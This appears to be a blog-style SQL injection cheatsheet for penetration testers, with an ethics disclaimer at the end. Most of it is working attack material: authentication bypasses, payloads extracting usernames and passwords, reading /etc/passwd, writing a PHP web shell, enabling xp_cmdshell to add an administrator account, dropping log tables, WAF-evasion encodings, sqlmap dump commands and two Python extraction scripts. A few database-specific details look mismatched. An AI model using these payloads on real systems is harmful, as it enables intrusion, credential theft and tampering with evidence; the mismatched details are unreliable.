---
title: "SQL Injection Cheatsheet - Penetration Testing Reference"
category: "Daily"
date: 2025-06-08
tags: ["penetration-testing", "sql-injection", "cheatsheet", "infosec"]
description: "A practical SQL Injection cheatsheet tailored for penetration testers, covering payloads, bypasses, and useful tips."
---

## 📋 Table of Contents
1. [SQL Fundamentals](#1-sql-fundamentals)
2. [SQLi Attack Classification](#2-sqli-attack-classification)
3. [Detection & Enumeration](#3-detection--enumeration)
4. [Database-Specific Payloads](#4-database-specific-payloads)
5. [Advanced Exploitation Techniques](#5-advanced-exploitation-techniques)
6. [Blind SQL Injection](#6-blind-sql-injection)
7. [Modern Attack Vectors](#7-modern-attack-vectors)
8. [WAF Bypass & Evasion](#8-waf-bypass--evasion)
9. [Automation & Tooling](#9-automation--tooling)
10. [Real-World Examples](#10-real-world-examples)

---

## 1. SQL Fundamentals

### 🔧 Core SQL Components
| Component | Purpose | SQLi Relevance |
|-----------|---------|----------------|
| **SELECT** | Data retrieval | Primary vector for data extraction |
| **WHERE** | Condition filtering | Injection point for logic manipulation |
| **FROM** | Table specification | Target identification |
| **UNION** | Combine query results | Data exfiltration technique |
| **ORDER BY** | Result sorting | Column count enumeration |
| **LIMIT** | Result limiting | Response size control |
| **NULL** | Empty value | UNION compatibility testing |

### 💬 SQL Comments Syntax
```sql
-- Standard comment (MySQL, MSSQL, PostgreSQL)
# MySQL-specific comment
/* Multi-line comment (Universal) */
/*!50000 MySQL version-specific comment */
```

### 🎯 Common Injection Points
- **GET Parameters**: `?id=1`, `?search=term`
- **POST Data**: Form fields, JSON payloads
- **HTTP Headers**: User-Agent, Cookie, X-Forwarded-For
- **File Uploads**: Filename, metadata
- **API Endpoints**: REST/GraphQL parameters

---

## 2. SQLi Attack Classification

### 📊 Attack Types Overview

| Type | Visibility | Detection Method | Difficulty | Use Case |
|------|------------|------------------|------------|----------|
| **🔴 Union-Based** | High | Direct data in response | ⭐ Easy | Fast data extraction |
| **🟠 Error-Based** | Medium | Error messages reveal data | ⭐ Easy | Information gathering |
| **🟡 Boolean Blind** | Low | True/false response patterns | ⭐⭐ Medium | Conditional data extraction |
| **🟢 Time-Based Blind** | None | Response timing analysis | ⭐⭐⭐ Hard | Stealth enumeration |
| **🔵 Out-of-Band** | External | DNS/HTTP callbacks | ⭐⭐⭐⭐ Expert | Network-restricted scenarios |

### 🔍 Detection Indicators

#### ✅ Positive Indicators
- SQL error messages in response
- Different response for `'` vs `''`
- Boolean logic changes (`OR 1=1` vs `OR 1=2`)
- Time delays with `SLEEP()` functions
- Different response sizes

#### ❌ False Positives
- Generic error pages
- WAF blocking responses
- Application-level validation errors
- Network timeouts

---

## 3. Detection & Enumeration

### 🚀 Initial Testing Payloads

#### Basic Detection
```sql
-- Single quote test
'

-- Logic bomb tests  
' OR 1=1--
' OR 1=2--
' AND 1=1--
' AND 1=2--

-- Numeric tests
1 OR 1=1
1 AND 1=2

-- Comment variations
' OR 1=1#
' OR 1=1/*
```

#### Authentication Bypass
```sql
-- Classic bypasses
admin'--
admin'/*
' OR 1=1--
' OR 'a'='a
' OR ''='
admin'/**/OR/**/1=1--

-- Username enumeration
admin' AND 1=1--
admin' AND 1=2--
```

### 📈 Union-Based Enumeration

#### Step 1: Column Count Detection
```sql
-- Method 1: ORDER BY
' ORDER BY 1--    ✅ Success
' ORDER BY 2--    ✅ Success  
' ORDER BY 3--    ❌ Error → 2 columns

-- Method 2: UNION NULL
' UNION SELECT NULL--         ❌ Error
' UNION SELECT NULL,NULL--    ✅ Success → 2 columns
```

#### Step 2: Visible Column Identification
```sql
-- Test which columns appear in response
' UNION SELECT 1,2--
' UNION SELECT 'A','B'--
' UNION SELECT @@version,database()--
```

#### Step 3: Data Extraction Template
```sql
-- Generic extraction pattern
' UNION SELECT [column1],[column2] FROM [table]--

-- Multiple table extraction
' UNION SELECT t1.username,t2.password FROM users t1, admin t2--
```

---

## 4. Database-Specific Payloads

### 🐬 MySQL Payloads

#### System Information
```sql
-- Version and configuration
' UNION SELECT @@version,@@hostname,@@datadir--
' UNION SELECT USER(),database(),@@port--
' UNION SELECT @@version_comment,@@socket,@@basedir--

-- Current privileges
' UNION SELECT USER(),CURRENT_USER(),SUPER_PRIV--
```

#### Schema Enumeration
```sql
-- List all databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- List tables in current database
' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema=database()--

-- List columns in specific table
' UNION SELECT column_name,data_type,is_nullable FROM information_schema.columns WHERE table_name='users'--
```

#### Data Extraction
```sql
-- Basic user data
' UNION SELECT username,password,email FROM users--

-- Concatenated extraction
' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--

-- Conditional extraction
' UNION SELECT IF(LENGTH(password)>10,password,'short') FROM users--
```

### 🐘 PostgreSQL Payloads

#### System Information
```sql
-- Version and environment
' UNION SELECT version(),current_database(),current_user()--
' UNION SELECT inet_server_addr(),inet_server_port(),current_setting('data_directory')--
```

#### Schema Enumeration
```sql
-- List databases
' UNION SELECT datname,NULL,NULL FROM pg_database--

-- List tables
' UNION SELECT tablename,schemaname,NULL FROM pg_tables WHERE schemaname='public'--

-- List columns
' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 🟦 Microsoft SQL Server Payloads

#### System Information
```sql
-- Version and configuration
' UNION SELECT @@version,DB_NAME(),SYSTEM_USER--
' UNION SELECT SERVERPROPERTY('ProductVersion'),SERVERPROPERTY('Edition'),HOST_NAME()--
```

#### Schema Enumeration
```sql
-- List databases
' UNION SELECT name,NULL,NULL FROM sys.databases--

-- List tables
' UNION SELECT name,type_desc,NULL FROM sys.objects WHERE type='U'--

-- List columns
' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--
```

### 🔶 Oracle Payloads

#### System Information
```sql
-- Version and instance info
' UNION SELECT banner,NULL,NULL FROM v$version--
' UNION SELECT instance_name,host_name,version FROM v$instance--
```

#### Schema Enumeration
```sql
-- List tables
' UNION SELECT table_name,owner,NULL FROM all_tables--

-- List columns
' UNION SELECT column_name,data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 5. Advanced Exploitation Techniques

### 🔥 Error-Based Extraction

#### MySQL Error-Based
```sql
-- ExtractValue function
' AND extractvalue(1,concat('~',(SELECT database()),'~'))--

-- UpdateXML function  
' AND updatexml(1,concat('~',(SELECT @@version),'~'),1)--

-- Double query technique
' AND (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--
```

#### PostgreSQL Error-Based
```sql
-- Type conversion errors
' AND CAST((SELECT version()) AS int)--
' AND CAST((SELECT current_database()) AS numeric)--

-- Array bounds error
' AND (SELECT * FROM generate_series(1,(SELECT ASCII(SUBSTR(database(),1,1)))))--
```

#### MSSQL Error-Based
```sql
-- Conversion errors
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT database()) AS int)--

-- Division by zero
' AND 1/(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users')=1--
```

### 💾 File Operations

#### MySQL File Operations
```sql
-- Read sensitive files
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),NULL,NULL--

-- Write web shells
' UNION SELECT '<?php system($_GET[cmd]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

-- Read MySQL configuration
' UNION SELECT LOAD_FILE('/etc/mysql/my.cnf'),NULL,NULL--
```

#### PostgreSQL File Operations
```sql
-- Read files (requires superuser)
'; COPY temp FROM '/etc/passwd'--

-- Create table for file operations
'; CREATE TABLE temp(data text)--
'; COPY temp FROM '/etc/passwd'--
'; SELECT * FROM temp--
```

### ⚡ Command Execution

#### MSSQL Command Execution
```sql
-- Enable xp_cmdshell (if disabled)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE--

-- Execute commands
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('net user hacker password123 /add')--
'; EXEC xp_cmdshell('net localgroup administrators hacker /add')--
```

#### PostgreSQL Command Execution
```sql
-- Create C function for system calls
'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c' STRICT--

-- Execute commands
'; SELECT system('id')--
'; SELECT system('cat /etc/passwd')--
```

### 🔄 Stacked Queries
```sql
-- Multiple statement execution
'; INSERT INTO users VALUES('hacker','password123')--
'; UPDATE users SET password='pwned' WHERE username='admin'--
'; CREATE TABLE backdoor(cmd text)--
'; DROP TABLE logs--
```

---

## 6. Blind SQL Injection

### 🔘 Boolean-Based Blind SQLi

#### Basic True/False Testing
```sql
-- True condition (should return normal response)
' AND 1=1--

-- False condition (should return different/empty response)  
' AND 1=2--

-- Database length enumeration
' AND LENGTH(database())>5--
' AND LENGTH(database())=8--
```

#### Character-by-Character Extraction
```sql
-- Extract database name
' AND SUBSTRING(database(),1,1)='a'--
' AND SUBSTRING(database(),1,1)='b'--
' AND SUBSTRING(database(),1,1)='c'--

-- ASCII method (more efficient)
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))=115--  -- 's'

-- Binary search optimization
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 65 AND 90--  -- A-Z
' AND ASCII(SUBSTRING(database(),1,1)) BETWEEN 97 AND 122-- -- a-z
```

#### Table and Column Enumeration
```sql
-- Count tables
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5--

-- Extract table names
' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='users'--

-- Extract column names
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)='username'--
```

### ⏰ Time-Based Blind SQLi

#### Database-Specific Time Functions
```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND (SELECT SLEEP(5) WHERE database()='testdb')--

-- PostgreSQL  
' AND PG_SLEEP(5)--
' AND (SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE 0 END)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--
' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END FROM dual)=1--
```

#### Conditional Time-Based Extraction
```sql
-- Extract database character by character
' AND IF(SUBSTRING(database(),1,1)='s',SLEEP(5),0)--
' AND IF(ASCII(SUBSTRING(database(),1,1))=115,SLEEP(5),0)--

-- Extract user credentials
' AND IF((SELECT username FROM users LIMIT 1)='admin',SLEEP(5),0)--
' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')>10,SLEEP(5),0)--
```

---

## 7. Modern Attack Vectors

### 🍃 NoSQL Injection (MongoDB)

#### JSON Parameter Injection
```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// Data extraction
{"username": {"$regex": "^admin"}}
{"$where": "this.username == 'admin'"}

// JavaScript injection
{"username": "admin", "$where": "function() { return true; }"}
```

#### URL Parameter NoSQL Injection
```
username[$ne]=admin&password[$ne]=pass
username[$regex]=^admin&password[$exists]=true
username[$nin][]=admin&username[$nin][]=test&password[$ne]=pass
```

### 🔌 WebSocket SQL Injection
```json
// WebSocket message injection
{"action": "search", "query": "test' UNION SELECT @@version--"}
{"type": "filter", "data": {"id": "1' OR 1=1--"}}

// Time-based via WebSocket
{"cmd": "getData", "id": "1'; WAITFOR DELAY '00:00:05'--"}
```

### 🌐 GraphQL Injection
```graphql
# Basic injection testing
query { user(id: "1' UNION SELECT @@version--") { name } }

# Introspection queries
query { __schema { types { name fields { name type { name } } } } }

# Nested injection
query { 
  posts(filter: {title: "test' UNION SELECT password FROM users--"}) {
    title content
  }
}
```

### 📱 Mobile App SQLi

#### Android SQLite Injection
```java
// Vulnerable code pattern
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
Cursor cursor = db.rawQuery(query, null);

// Exploitation
userInput = "admin' OR '1'='1"
```

#### iOS Core Data Injection
```objc
// Vulnerable NSPredicate
NSString *predicateString = [NSString stringWithFormat:@"name = '%@'", userInput];
NSPredicate *predicate = [NSPredicate predicateWithFormat:predicateString];

// Exploitation
userInput = @"' OR 1=1--"
```

---

## 8. WAF Bypass & Evasion

### 🛡️ Character Encoding Techniques

#### URL Encoding Variations
```sql
-- Standard URL encoding
%27 = '
%20 = space
%2D%2D = --

-- Double URL encoding
%2527 = %27 = '
%252D%252D = %2D%2D = --

-- Unicode encoding
%u0027 = '
%u0020 = space
```

#### MySQL Hex Encoding
```sql
-- Hex string literals
' UNION SELECT 0x61646D696E,0x70617373776F7264-- 
-- (admin,password in hex)

-- CHAR function
' UNION SELECT CHAR(97,100,109,105,110),CHAR(112,97,115,115)--
-- (admin,pass using ASCII)
```

### 🎭 Keyword Obfuscation

#### Case Manipulation
```sql
-- Mixed case
UnIoN SeLeCt @@VeRsIoN
sElEcT * fRoM uSeRs

-- Alternate case patterns
uNiOn aLl SeLeCt
```

#### Comment Insertion
```sql
-- MySQL comment injection
UN/**/ION SE/**/LECT
SEL/**/ECT/**/@@version

-- Multi-line comments
UNION/*comment*/SELECT
SELECT/**/password/**/FROM/**/users
```

#### Whitespace Variation
```sql
-- Tab characters
UNION%09SELECT
SELECT%09*%09FROM%09users

-- Multiple spaces
UNION    SELECT
SELECT        *        FROM        users

-- Newline characters
UNION%0ASELECT
SELECT%0D%0A*%0D%0AFROM%0D%0Ausers
```

### 🔧 Alternative Syntax

#### Operator Alternatives
```sql
-- OR alternatives
|| (MySQL, PostgreSQL)
| (MSSQL bitwise OR in some contexts)

-- AND alternatives  
&& (MySQL)
& (MSSQL bitwise AND in some contexts)

-- Comment alternatives
-- (standard)
# (MySQL)
/* */ (universal)
;%00 (null byte)
```

#### Function Alternatives
```sql
-- String concatenation
CONCAT(a,b) = a||b (PostgreSQL)
a+b (MSSQL)

-- Substring alternatives  
SUBSTRING(str,1,1) = LEFT(str,1) = str[1:1]
MID(str,1,1) (MySQL)
```

### 🚫 Advanced WAF Bypass

#### HTTP Parameter Pollution
```
?id=1&id=' UNION SELECT @@version--
```

#### Content-Type Manipulation
```http
Content-Type: application/json
{"id": "1' UNION SELECT @@version--"}

Content-Type: text/xml
<id>1' UNION SELECT @@version--</id>
```

#### Version-Specific Comments
```sql
-- MySQL version comments
/*!50000UNION*/ /*!50000SELECT*/ @@version
/*!12345UNION SELECT*/ @@version

-- Conditional execution
/*!50001SELECT @@version*/
```

---

## 9. Automation & Tooling

### 🔨 SQLMap Mastery

#### Basic Usage
```bash
# URL parameter testing
sqlmap -u "http://target.com/page.php?id=1"

# POST data testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Cookie-based testing
sqlmap -u "http://target.com/profile.php" --cookie="PHPSESSID=abc123"
```

#### Advanced SQLMap Options
```bash
# Custom injection points
sqlmap -u "http://target.com/search.php" --data="query=test*" 

# Specific DBMS testing
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Risk and level adjustment
sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5

# WAF detection and bypass
sqlmap -u "http://target.com/page.php?id=1" --identify-waf --tamper=space2comment
```

#### Data Extraction with SQLMap
```bash
# List databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# Search for specific data
sqlmap -u "http://target.com/page.php?id=1" --search -C password,username
```

### 🐍 Python Automation Scripts

#### Basic SQLi Detector
```python
import requests
import time
from urllib.parse import urlencode

class SQLiDetector:
    def __init__(self):
        self.payloads = [
            "'",
            "' OR 1=1--",
            "' AND 1=2--", 
            "' UNION SELECT NULL--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
    def test_parameter(self, url, param, value):
        vulnerable = False
        
        for payload in self.payloads:
            test_value = value + payload
            params = {param: test_value}
            
            try:
                start_time = time.time()
                response = requests.get(url, params=params, timeout=10)
                response_time = time.time() - start_time
                
                # Check for SQL errors
                error_signatures = ['sql', 'mysql', 'ora-', 'postgresql', 'sqlite']
                for signature in error_signatures:
                    if signature in response.text.lower():
                        print(f"[+] SQL Error detected with payload: {payload}")
                        vulnerable = True
                        
                # Check for time-based injection
                if response_time > 4:
                    print(f"[+] Time-based SQLi detected: {response_time}s delay")
                    vulnerable = True
                    
            except requests.RequestException as e:
                print(f"[-] Request failed: {e}")
                
        return vulnerable

# Usage
detector = SQLiDetector()
detector.test_parameter("http://target.com/search.php", "q", "test")
```

#### Boolean Blind SQLi Extractor
```python
import requests
import string

class BlindSQLiExtractor:
    def __init__(self, url, param, true_response_length):
        self.url = url
        self.param = param
        self.true_length = true_response_length
        self.charset = string.ascii_letters + string.digits + '_-@.'
        
    def test_condition(self, condition):
        payload = f"' AND ({condition})--"
        params = {self.param: payload}
        
        try:
            response = requests.get(self.url, params=params, timeout=5)
            return len(response.text) == self.true_length
        except:
            return False
    
    def extract_string(self, query, max_length=50):
        result = ""
        
        for position in range(1, max_length + 1):
            found = False
            
            for char in self.charset:
                condition = f"SUBSTRING(({query}),{position},1)='{char}'"
                
                if self.test_condition(condition):
                    result += char
                    print(f"[+] Found: {result}")
                    found = True
                    break
                    
            if not found:
                break
                
        return result
    
    def extract_database(self):
        return self.extract_string("SELECT database()")
    
    def extract_tables(self):
        # Get table count first
        for i in range(1, 20):
            condition = f"(SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())={i}"
            if self.test_condition(condition):
                table_count = i
                break
        
        tables = []
        for i in range(table_count):
            query = f"SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1"
            table = self.extract_string(query)
            if table:
                tables.append(table)
                
        return tables

# Usage
extractor = BlindSQLiExtractor("http://target.com/page.php", "id", 1234)
database = extractor.extract_database()
tables = extractor.extract_tables()
```

### 🌐 Burp Suite Integration

#### Custom Payloads for Intruder
```
'
''
' OR 1=1--
' OR '1'='1
' OR 'a'='a
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
'; WAITFOR DELAY '00:00:05'--
' AND SLEEP(5)--
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
```

#### Burp Extensions for SQLi
- **SQLiPy**: Python-based SQLi detection
- **CO2**: Useful for SQLi testing utilities  
- **ActiveScan++**: Extended scanning capabilities
- **Autorize**: Authorization testing (useful for privilege escalation)

---

## 10. Real-World Examples

### 🏆 Famous Bug Bounty Discoveries

#### HackerOne Hall of Fame
```sql
-- Shopify GraphQL SQLi (2020) - $25,000 bounty
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,shop_domain FROM shops LIMIT 1--

-- Yahoo SQLi (2013) - Critical impact
' UNION SELECT NULL,version(),NULL,NULL,NULL--

-- Uber SQL Injection (2017) - Account takeover
' UNION SELECT user_uuid,password_hash,email FROM users WHERE email='target@uber.com'--
```

#### Bug Bounty Tips
```sql
-- Test forgotten endpoints
/admin/backup.php?file=../../../etc/passwd
/api/v1/debug?query=' UNION SELECT @@version--

-- Mobile API endpoints
/mobile/api/login.php (often less protected)
/app/api/user_data.php?id=1' UNION SELECT * FROM admin_users--

-- GraphQL endpoints
/graphql?query={users{id,email,password_hash}}
```

### 🚩 CTF Competition Payloads

#### PicoCTF Style Challenges
```sql
-- Simple flag extraction
' UNION SELECT flag FROM flags--
' UNION SELECT * FROM secret_table WHERE id=1--

-- Encoded flags
' UNION SELECT HEX(flag) FROM flags--
' UNION SELECT TO_BASE64(flag) FROM flags--

-- Nested queries
' UNION SELECT (SELECT flag FROM flags WHERE difficulty='easy') AS flag--
```

#### OverTheWire/Natas Techniques
```sql
-- File reading challenges
' UNION SELECT LOAD_FILE('/flag.txt')--
' UNION SELECT LOAD_FILE('/home/flag/flag.txt')--

-- Multi-step challenges
' UNION SELECT password FROM users WHERE username='admin'--
-- Use extracted password in next level
```

#### Google CTF Advanced Techniques
```sql
-- Complex boolean logic
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flags LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

-- Time-based with conditional logic
' AND IF((SELECT SUBSTRING(flag,1,1) FROM flags)='C',SLEEP(5),0)--
```

### 🎯 Penetration Testing Scenarios

#### Web Application Assessment
```sql
-- Initial reconnaissance
' UNION SELECT @@version,USER(),database()--

-- Privilege escalation discovery
' UNION SELECT user,password,file_priv FROM mysql.user--

-- Sensitive data hunting
' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE column_name LIKE '%password%'--
' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE column_name LIKE '%credit%'--
```

#### API Security Testing
```json
// REST API JSON injection
{"user_id": "1' UNION SELECT api_key FROM api_keys WHERE user_id=1--"}

// GraphQL injection
query { user(id: "1' UNION SELECT password FROM users WHERE id=1--") { name } }
```

---

## 🚨 Ethical Guidelines & Legal Notice

### ✅ Authorized Testing Only
- **Always obtain explicit written permission** before testing
- **Scope limitation**: Test only systems you own or have authorization for
- **Responsible disclosure**: Report vulnerabilities through proper channels
- **Documentation**: Keep detailed logs of testing activities

### 🎯 Professional Use Cases
- **Penetration Testing Engagements**
- **Bug Bounty Programs** (within scope)
- **Security Assessments** (authorized)
- **Educational Purposes** (controlled environments)
- **CTF Competitions**

### ❌ Prohibited Activities
- Testing without explicit authorization
- Accessing or modifying data without permission  
- Disrupting production systems
- Selling or distributing sensitive data
- Using techniques for malicious purposes

---

## 📚 Additional Resources

### 🔗 Learning Platforms
- **PortSwigger Web Security Academy**: Free SQLi labs
- **OWASP WebGoat**: Hands-on practice environment
- **SQLi-Labs**: Dedicated SQLi practice platform
- **TryHackMe**: Guided SQLi learning paths

### 📖 Reference Materials
- **OWASP SQL Injection Prevention Cheat Sheet**
- **PortSwigger SQLi Documentation**
- **MySQL/PostgreSQL/MSSQL Official Documentation**
- **SQLMap Documentation**

### 🛠️ Essential Tools
- **SQLMap**: Automated SQLi exploitation
- **Burp Suite**: Manual testing and automation
- **NoSQLMap**: NoSQL injection testing
- **jSQL Injection**: Java-based SQLi tool

---

*This cheatsheet is intended for authorized security testing and educational purposes only. The author assumes no responsibility for misuse of the information provided. Always follow responsible disclosure practices and respect applicable laws and regulations.*

---

**📝 Last Updated**: June 2025 | **✍️ Author**: Professional Penetration Tester